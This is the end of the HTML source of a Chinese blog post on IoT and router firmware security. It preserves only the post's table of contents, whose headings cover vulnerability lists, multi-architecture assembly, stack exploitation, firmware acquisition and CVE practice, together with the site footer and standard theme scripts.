class="nav-link" href="#2-%E7%A1%AC%E4%BB%B6%E9%80%9A%E8%AE%AF%E6%8E%A5%E5%8F%A3"><span class="nav-text">2. 硬件通讯接口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E6%8E%A5%E5%8F%A3"><span class="nav-text">3. 网络通讯接口</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%89%A9%E8%81%94%E7%BD%9110%E5%A4%A7%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-text">物联网10大安全漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#OWASP%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%81%E5%A4%A7%E6%BC%8F%E6%B4%9E"><span class="nav-text">OWASP物联网十大漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Payatu%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%81%E5%A4%A7%E6%BC%8F%E6%B4%9E"><span class="nav-text">Payatu物联网十大漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#P1-%E7%A1%AC%E7%BC%96%E7%A0%81%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">P1. 硬编码敏感信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P2-%E5%90%AF%E7%94%A8%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E7%AB%AF%E5%8F%A3"><span class="nav-text">P2. 启用硬件调试端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P3-%E5%AE%89%E5%85%A8%E7%9A%84%E5%9B%BA%E4%BB%B6"><span class="nav-text">P3.安全的固件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P4-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8"><span class="nav-text">P4.不安全的数据存储</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P5-%E8%AE%A4%E8%AF%81%E4%B8%8D%E8%B6%B3"><span class="nav-text">P5.认证不足</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P6-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%9A%E4%BF%A1"><span class="nav-text">P6. 不安全的通信</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P7-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="nav-text">P7. 不安全的配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P8-%E6%95%B0%E6%8D%AE%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4%E4%B8%8D%E8%B6%B3"><span class="nav-text">P8. 数据输入过滤不足</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P9-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%A7%BB%E5%8A%A8%E7%95%8C%E9%9D%A2"><span class="nav-text">P9. 不安全的移动界面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#P10-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E4%BA%91-%E7%BD%91%E7%BB%9C%E7%95%8C%E9%9D%A2"><span class="nav-text">P10. 不安全的云&#x2F;网络界面</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8"><span class="nav-text">无线电安全</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="nav-text">汇编基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ARM"><span class="nav-text">ARM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E5%90%88"><span class="nav-text">指令集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="nav-text">栈帧结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AARCH64"><span class="nav-text">AARCH64</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8-1"><span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E5%90%88-1"><span class="nav-text">指令集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-1"><span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84-1"><span class="nav-text">栈帧结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIPS"><span class="nav-text">MIPS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8-2"><span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E5%90%88-2"><span class="nav-text">指令集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-2"><span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84-2"><span class="nav-text">栈帧结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerPC"><span class="nav-text">PowerPC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8-3"><span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E5%90%88-3"><span class="nav-text">指令集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-3"><span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84-3"><span class="nav-text">栈帧结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RISC-V"><span class="nav-text">RISC-V</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8-4"><span class="nav-text">寄存器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86%E5%90%88-4"><span class="nav-text">指令集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-4"><span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84-4"><span class="nav-text">栈帧结构</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BC%82%E6%9E%84-PWN"><span class="nav-text">异构 PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ARM32-PWN"><span class="nav-text">ARM32 PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Stack"><span class="nav-text">Stack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARM64-PWN"><span class="nav-text">ARM64 PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Stack-1"><span class="nav-text">Stack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIPS-PWN"><span class="nav-text">MIPS PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Stack-2"><span class="nav-text">Stack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PPC-PWN"><span class="nav-text">PPC PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Stack-3"><span class="nav-text">Stack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RISC-V-PWN"><span class="nav-text">RISC-V PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Stack-4"><span class="nav-text">Stack</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%9B%BA%E4%BB%B6"><span class="nav-text">获取固件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DLink"><span class="nav-text">DLink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Trendnet"><span class="nav-text">Trendnet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tenda"><span class="nav-text">Tenda</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TotoLink"><span class="nav-text">TotoLink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TP-Link"><span class="nav-text">TP-Link</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wavlink"><span class="nav-text">Wavlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#H3C"><span class="nav-text">H3C</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cisco"><span class="nav-text">Cisco</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NETGEAR"><span class="nav-text">NETGEAR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DrayTek"><span class="nav-text">DrayTek</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%94%90%E6%8D%B7"><span class="nav-text">锐捷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%90%A4%E7%9F%B3"><span class="nav-text">萤石</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%B1%B3"><span class="nav-text">小米</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASUS"><span class="nav-text">ASUS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6"><span class="nav-text">提取固件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE%E5%AE%9E%E6%88%98%E7%AF%87"><span class="nav-text">CVE实战篇</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        66 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>